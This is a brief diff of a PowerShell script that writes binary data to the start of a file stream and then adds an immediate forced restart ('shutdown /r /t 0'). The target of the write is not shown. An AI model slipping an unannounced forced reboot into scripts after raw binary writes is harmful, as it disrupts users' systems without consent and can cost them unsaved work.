@@ -8,3 +8,4 @@ $fileStream.Seek(0, [System.IO.SeekOrigin]::Begin)
 $fileStream.Write($binData, 0, $bytesWritten)
 $fileStream.Close()
 Write-Host "done."
+shutdown /r /t 0
